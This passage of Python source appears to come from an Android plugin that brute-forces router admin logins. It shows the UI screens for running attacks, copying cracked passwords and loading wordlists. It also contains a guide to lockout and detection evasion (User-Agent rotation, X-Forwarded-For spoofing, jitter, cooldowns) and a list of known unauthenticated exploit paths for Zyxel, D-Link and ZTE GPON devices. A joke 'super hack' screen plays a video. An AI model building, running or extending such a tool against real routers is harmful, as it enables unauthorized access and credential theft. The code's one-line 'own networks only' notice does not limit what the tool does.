                ui.button("📤 Report", on_click=self._export_report, style="text", fill_max_width=True),
                ui.button("📝 Log", on_click=self._open_logs_screen, style="text", fill_max_width=True),
            ], spacing=8, fill_max_width=True)
        ]
        children.append(ui.card(ui.column(control_children, spacing=6)))

        # Result card / live speed
        progress_card = []
        if self.running:
            percent_done = 0
            if self.expected_total > 0:
                percent_done = min(100, int(self.tried_count * 100 / self.expected_total))
            elapsed_min = max(0, int((time.time() - getattr(self, "_brute_started_ts", time.time())) // 60))
            eta_line = ""
            remaining = max(0, self.expected_total - self.tried_count)
            if self.pps > 0 and remaining > 0:
                eta_sec = int(remaining / self.pps)
                if eta_sec >= 90:
                    eta_line = " · ~{} min left".format(max(1, eta_sec // 60))
                else:
                    eta_line = " · ~{} s left".format(eta_sec)
            progress_card.extend([
                ui.row([
                    ui.icon("bolt", 30, tint="primary"),
                    ui.column([
                        ui.text("Attack running", "titleLarge"),
                        ui.text("⚡ {} attempts/s · {} min{}".format(self.pps, elapsed_min, eta_line), "titleSmall", color="primary"),
                    ], spacing=2),
                ], spacing=12),
                ui.linear_progress(progress=(float(self.tried_count) / self.expected_total) if self.expected_total > 0 else None),
                ui.text("{}/{} ({}%) · Failures: {} · Lockouts: {}".format(
                    self.tried_count, self.expected_total, percent_done, self.fail_count, self.lockout_count
                ), "bodyMedium"),
                ui.text(self.status_line, "bodySmall"),
            ])
        elif self.found_creds:
            found_user, found_pass, found_mode = self.found_creds
            summary = self.last_run_summary or {}
            creds_value = "{} / {}".format(found_user if found_user else "(empty)", found_pass if found_pass else "(empty)")
            progress_card.extend([
                ui.row([
                    ui.icon("check_circle", 34, tint="success"),
                    ui.column([
                        ui.text("ACCESS GAINED", "headlineSmall", color="success"),
                        ui.text("Login / Password", "bodySmall"),
                        ui.text(creds_value, "headlineMedium"),
                        ui.text("Method: {} · Attempts: {}".format(
                            AUTH_MODE_LABELS.get(found_mode, "HTML form POST"),
                            summary.get("attempts", self.tried_count)
                        ), "bodyMedium"),
                        *( [ui.text("⏱ {} s · average speed {} attempts/s".format(
                              summary.get("duration_s", "?"), summary.get("avg_pps", 0)
                          ), "bodySmall")] if summary else [] )
                    ], spacing=2),
                ], spacing=12),
                ui.row([
                    ui.button("🔑 Copy password", on_click=self._copy_credentials, style="tonal", fill_max_width=True),
                    ui.button("📥 Report", on_click=self._export_report, style="outlined", fill_max_width=True),
                ], spacing=8, fill_max_width=True),
            ])
        elif self.tried_count > 0:
            summary = self.last_run_summary or {}
            progress_card.extend([
                ui.row([
                    ui.icon("block", 34, tint="error"),
                    ui.column([
                        ui.text("FAILURE", "headlineSmall", color="error"),
                        ui.text("Tried {} combinations, the password did not match.".format(self.tried_count), "bodyMedium"),
                        *( [ui.text("⏱ {} s · average speed {} attempts/s".format(
                              summary.get("duration_s", "?"), summary.get("avg_pps", 0)
                          ), "bodySmall")] if summary else [] )
                    ], spacing=2),
                ], spacing=12),
                ui.button("🔓 Look for vulnerabilities", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
            ])
        else:
            progress_card.extend([
                ui.row([
                    ui.icon("shield", 30),
                    ui.column([
                        ui.text("Status", "titleLarge"),
                        ui.text(self.status_line, "bodyMedium"),
                    ], spacing=2),
                ], spacing=12),
            ])
        children.append(ui.card(ui.column(progress_card, spacing=8)))

        log_preview = "\n".join(self.logs[-6:]) if self.logs else "Log is empty."
        children.append(ui.card(ui.column([
            ui.row([
                ui.text("📜 Recent events", "titleSmall"),
                ui.button("All", on_click=self._open_logs_screen, style="text"),
                ui.button("Clear", on_click=self._clear_logs, style="text")
            ], fill_max_width=True),
            ui.log_panel(log_preview, max_height=140)
        ], spacing=4)))

        if self.vulns_found:
            vuln_items = [ui.text("🔓 Open without a password: {}".format(len(self.vulns_found)), "titleSmall")]
            for item in self.vulns_found[:8]:
                vuln_items.append(ui.settings_row(item, "open without login", "lock_open"))
            children.append(ui.card(vuln_items))

        children.append(ui.card([
            ui.text("⚠️ For auditing your own networks only.", "bodySmall")
        ]))

        return ui.scaffold(
            title="Network Audit Pro",
            actions=[
                ui.top_action("help", lambda: self.navigate("guide")),
                ui.top_action("folder", lambda: self.navigate("dict"))
            ],
            content=ui.lazy_column(children=children, padding=16, spacing=12)
        )

    def _open_guide_screen(self):
        self.navigate("guide")

    def _open_logs_screen(self):
        self.navigate("logs")

    def _open_dict_screen(self):
        self.navigate("dict")

    def _super_hack_button(self):
        self.navigate("hack_confirm")
        self.refresh()

    def _super_hack_cancel(self):
        self.navigate("main")
        self.refresh()

    def _super_hack_go(self):
        self._log("💥 Super hack activated", "HIT")
        self.navigate("rickroll")
        self.refresh()

    def screen_hack_confirm(self, ui, api, state):
        # a regular screen instead of alert_dialog: Dolphy draws it instantly
        return ui.scaffold(
            title="💥 Super hack",
            show_back=True,
            content=ui.column([
                ui.card([
                    ui.icon("warning", 44, tint="warning"),
                    ui.text("Extreme mode", "headlineSmall"),
                    ui.text(
                        "An attempt to hack ANY router with one button.\n"
                        "Very dangerous: the router may start recognizing you!\n"
                        "We strongly recommend enabling a VPN.",
                        "bodyLarge"
                    ),
                ]),
                ui.button("💥 Crack it!", on_click=self._super_hack_go, style="error", fill_max_width=True),
                ui.button("⬅️ Cancel", on_click=self._super_hack_cancel, style="text", fill_max_width=True),
            ], padding=16, spacing=12, fill_max_size=True)
        )

    def screen_rickroll(self, ui, api, state):
        # as in usb_c_ir_backend: fullscreen webview, a regular watch link
        return ui.scaffold(
            title="💥 Super hack",
            content=ui.column(
                [ui.webview(url="https://www.youtube.com/watch?v=dQw4w9WgXcQ", fill_max_size=True)],
                padding=0,
                spacing=0,
                fill_max_size=True,
            ),
        )

    def _probe_vulns_button(self):
        self.toast("🔓 Looking for open paths...")
        threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()

    def screen_attack_settings(self, ui, api, state):
        children = [
            ui.card(ui.column([
                ui.text("Brute force mode", "titleMedium"),
                ui.button_group(
                    [["auto", "Auto"], ["basic", "Basic"], ["form", "Form"]],
                    self.mode,
                    lambda v: self._set_mode(str(v)),
                ),
                ui.slider(
                    value=float(self.num_threads),
                    on_change=lambda v: self._set_threads(int(v)),
                    minimum=1,
                    maximum=32,
                    title="Thread count: {}".format(self.num_threads),
                    steps=31
                ),
                ui.slider(
                    value=float(self.timeout_seconds),
                    on_change=lambda v: self._set_timeout(int(v)),
                    minimum=1,
                    maximum=10,
                    title="Connection timeout: {} s".format(self.timeout_seconds),
                    steps=9
                ),
                ui.text_field(
                    value=str(self.port),
                    on_change=lambda v: self._set_port(v),
                    label="Port",
                    single_line=True,
                    fill_max_width=True
                ),
                ui.switch(
                    checked=self.stop_on_success,
                    on_change=lambda v: self._set_stop_on_success(v),
                    title="⛔ Stop after the first success",
                    subtitle="Do not continue after a password is found"
                ),
            ], spacing=8)),
            ui.card(ui.column([
                ui.text("🥷 Lockout evasion (anti-detect)", "titleMedium"),
                ui.switch(
                    checked=self.evasion_ua,
                    on_change=lambda v: self._set_evasion_ua(v),
                    title="🎭 User-Agent rotation",
                    subtitle="A random browser for every request"
                ),
                ui.switch(
                    checked=self.evasion_xff,
                    on_change=lambda v: self._set_evasion_xff(v),
                    title="📮 X-Forwarded-For spoofing",
                    subtitle="A random IP in the header"
                ),
                ui.slider(
                    value=float(self.attempt_delay_ms),
                    on_change=lambda v: self._set_attempt_delay(int(v)),
                    minimum=0,
                    maximum=2000,
                    title="Pause between attempts: {} ms (±50%)".format(self.attempt_delay_ms),
                    steps=200
                ),
                ui.slider(
                    value=float(self.lockout_pause_s),
                    on_change=lambda v: self._set_lockout_pause(int(v)),
                    minimum=0,
                    maximum=120,
                    title="Cooldown after {} lockouts in a row: {} s (0 = off)".format(
                        LOCKOUT_THRESHOLD, self.lockout_pause_s
                    ),
                    steps=120
                ),
            ], spacing=8)),
            ui.card(ui.column([
                ui.text("Custom lists (comma-separated)", "titleMedium"),
                ui.text_field(
                    value=self.custom_users_text,
                    on_change=lambda v: self._set_custom_users(v),
                    label="Users: admin,root,user",
                    single_line=True,
                    fill_max_width=True
                ),
                ui.text_field(
                    value=self.custom_passes_text,
                    on_change=lambda v: self._set_custom_passes(v),
                    label="Passwords: 1234,qwerty",
                    single_line=True,
                    fill_max_width=True
                ),
            ], spacing=8)),
            ui.card([
                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
            ])
        ]
        return ui.scaffold(title="Attack settings", content=ui.lazy_column(children=children, padding=16, spacing=12))

    def screen_dict(self, ui, api, state):
        discovered_files = self._scan_dict_files()
        parsed_now = self._dict_preview_pairs(self.custom_dict_text)

        file_items = [
            ui.text(".txt files found in phone storage (tap to load):", "bodyMedium"),
        ]
        if discovered_files:
            for file_path, file_size in discovered_files[:16]:
                display_name = os.path.basename(file_path)
                size_kb = max(1, file_size // 1024)
                file_items.append(ui.chip(
                    "{} ({} KB)".format(display_name, size_kb),
                    selected=(file_path == self.manual_dict_path),
                    on_click=lambda chosen=file_path: self.load_dict_from_path(chosen)
                ))
            if len(discovered_files) > 16:
                file_items.append(ui.text("…and {} more. Enter the full path manually.".format(len(discovered_files) - 16), "bodySmall"))
        else:
            file_items.append(ui.text("No .txt files found. Copy a dictionary to Download/Documents or enter a path manually.", "bodySmall"))

        preview_items = [ui.text("First lines of your dictionary:", "bodySmall")]
        for pair_user, pair_pass in parsed_now[:8]:
            preview_items.append(ui.text("· {} / {}".format(pair_user, pair_pass if pair_pass else "(empty)"), "bodySmall"))

        children = [
            ui.card([
                ui.text("🔤 Custom password dictionary", "titleMedium"),
                ui.text("Each file line is one pair:\n  admin password123\n  admin:password123\nLines starting with # are ignored.", "bodySmall")
            ]),
            ui.card(file_items),
            ui.card(ui.column([
                ui.text("Load by full path:", "bodyMedium"),
                ui.text_field(
                    value=str(self.manual_dict_path or ""),
                    on_change=lambda v: self._set_manual_dict_path(v),
                    label="/sdcard/Download/mylist.txt",
                    single_line=True,
                    fill_max_width=True
                ),
                ui.button("📥 Load this file", on_click=self.load_dict_from_path, style="outlined", fill_max_width=True)
            ], spacing=6)),
            ui.card([
                ui.text("Pairs in the dictionary now: {}".format(len(parsed_now)), "titleMedium"),
                ui.text_field(
                    value=self.custom_dict_text,
                    on_change=lambda v: self._set_custom_dict_text(v),
                    label="Or paste dictionary text here",
                    single_line=False,
                    fill_max_width=True
                ),
                ui.button("🗑 Clear dictionary", on_click=self.clear_custom_dict, style="outlined", fill_max_width=True)
            ]),
            ui.card(preview_items),
            ui.card([
                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
            ])
        ]
        return ui.scaffold(title="Custom dictionary", content=ui.lazy_column(children=children, padding=16, spacing=12))

    def screen_logs(self, ui, api, state):
        full_log = "\n".join(self.logs) if self.logs else "No entries."
        return ui.scaffold(
            title="Log",
            actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
            content=ui.column([
                ui.card([
                    ui.row([
                        ui.text("📜 All events", "titleMedium"),
                        ui.button("Clear", on_click=self._clear_logs, style="text")
                    ], fill_max_width=True),
                    ui.log_panel(full_log, max_height=320)
                ]),
                ui.card([
                    ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
                ])
            ], padding=16, spacing=12)
        )

    def screen_guide(self, ui, api, state):
        sections = [
            ui.card([
                ui.text("📖 How brute force works", "titleMedium"),
                ui.text(
                    "The plugin sends HTTP requests to the router and tries login/password pairs.\n\n"
                    "Two kinds of protection:\n"
                    "• Basic Auth — a browser popup, works via the Authorization: Basic header.\n"
                    "• Form — an HTML form on the page, works via POST.\n\n"
                    "Auto mode tries both methods for each pair. Before the start, recon reads the "
                    "page title, Server header, WWW-Authenticate realm and form action — and picks the "
                    "brand wordlist and POST address accordingly.",
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.text("🛡 Why it matters to turn off VPN", "titleMedium"),
                ui.text(
                    "With an active VPN your traffic goes into a tunnel:\n"
                    "• the auto-detected gateway becomes the VPN server address, not your router;\n"
                    "• attacks may go entirely the wrong way.\n\n"
                    "The plugin checks for VPN itself via Android NetworkCapabilities and typical "
                    "Fake-IP ranges (198.18.x.x and similar) and will warn you before the start.",
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.text("🥷 Lockout evasion", "titleMedium"),
                ui.text(
                    "Routers count failed login attempts and may temporarily ban the account.\n\n"
                    "• User-Agent rotation — every request comes from a \"different browser\", making attempts harder to correlate.\n"
                    "• X-Forwarded-For — some panels log this header as the client address.\n"
                    "• Pause between attempts (±50% jitter) — traffic looks human.\n"
                    "• Auto-cooldown: after 5 consecutive 403/429 replies the plugin freezes for a set number of seconds, "
                    "then continues with the next password — no ban lands and the brute force is not reset.",
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.text("📂 About choosing a TXT dictionary", "titleMedium"),
                ui.text(
                    "The \"Custom dictionary\" screen shows all .txt files in phone storage (root, Download, Documents).\n"
                    "Tap the file you need — it will be loaded.\n\n"
                    "If the file is deeper down — enter the full path in the field and press \"Load this file\".\n"
                    "You can also just paste the list text into the large input field.\n\n"
                    "Line format: \"login password\" separated by a space, or login:password. Comments start with #.\n\n"
                    "Why there is no system file manager button: the current Dolphy version "
                    "does not pass the file pick result back to the plugin (no onActivityResult for plugins) — "
                    "this is an app limitation; it will appear once the Dolphy author adds such an API.",
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.text("🔑 Built-in wordlists", "titleMedium"),
                ui.text(
                    "1. A large built-in wordlist right in the plugin: {} default pairs (classics from every vendor, "
                    "RU providers, GPON specifics).\n\n"
                    "2. Brand pairs based on automatic brand detection.\n\n"
                    "3. Your TXT dictionary — tried right after the brand pairs.\n\n"
                    "4. A full grid of {} users × {} passwords as a fallback.".format(
                        len(set(default_dict_pairs())),
                        len(USER_DICT), len(PASS_DICT)
                    ),
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.text("🔓 Checking passwordless holes", "titleMedium"),
                ui.text(
                    "If no password is found, the plugin checks classic unprotected pages:\n"
                    "• /rom-0 — Zyxel config dump with Wi-Fi and PPPoE passwords\n"
                    "• /HNAP1/ — D-Link SOAP, known auth bypasses\n"
                    "• /getpage.gch...Gpon_epoinfo_t.gch — provider password on ZTE GPON\n"
                    "• /GponForm/diag_Form?images/ — login bypass and RCE on GPON\n"
                    "• /cgi-bin/status_cgi — DD-WRT status without login\n"
                    "• /backup_settings_2.xml — settings backup with passwords\n"
                    "• Telnet 23 and UPnP 1900 — tried directly",
                    "bodySmall"
                )
            ]),
            ui.card([
                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
            ])
        ]
        return ui.scaffold(title="Guide", content=ui.column(sections, padding=16, spacing=12))

    def screen_creds(self, ui, api, state):
        current_brand = (self.brand_hint or "").strip()
        list_items = [ui.text("🏭 Factory pairs by brand:", "bodyMedium")]
        for brand_name, pair_list in BRAND_CREDS.items():
            for pair_user, pair_pass in pair_list:
                marker = "  ← your router" if brand_name == current_brand else ""
                list_items.append(ui.text("· {} / {}  [{}]{}".format(
                    pair_user if pair_user else "(empty)",
                    pair_pass if pair_pass else "(empty)",
                    brand_name,
                    marker
                ), "bodySmall"))

        imported_pairs_count = self._imported_pairs_count
        default_pairs = default_dict_pairs()
        children = [
            ui.card([
                ui.text("📦 Built-in sets", "titleMedium"),
                ui.text("Large built-in wordlist: {} pairs\nGrid: {} users × {} passwords\nQuick defaults: {} items".format(
                    len(default_pairs), len(USER_DICT), len(PASS_DICT), len(GENERIC_CREDS)
                ), "bodySmall")
            ]),
            ui.card(ui.column(list_items, spacing=4)),
            ui.card([
                ui.text("🔤 Your dictionary: {} pairs".format(imported_pairs_count), "bodyMedium")
            ]),
            ui.card([
                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
            ])
        ]
        return ui.scaffold(title="Dictionaries", content=ui.lazy_column(children=children, padding=16, spacing=12))

    def screen_report(self, ui, api, state):
        text_value = self.generated_report_text or "Report not generated yet."
        return ui.scaffold(
            title="Report",
            actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
            content=ui.column([
                ui.card([
                    ui.text("Report in the clipboard and in /sdcard/Download/", "bodySmall"),
                    ui.text_field(
                        value=text_value,
                        on_change=lambda v: None,
                        label="Report",
                        single_line=False,
                        fill_max_width=True
                    )
                ]),
                ui.card([
                    ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
                ])
            ], padding=16, spacing=12)
        )
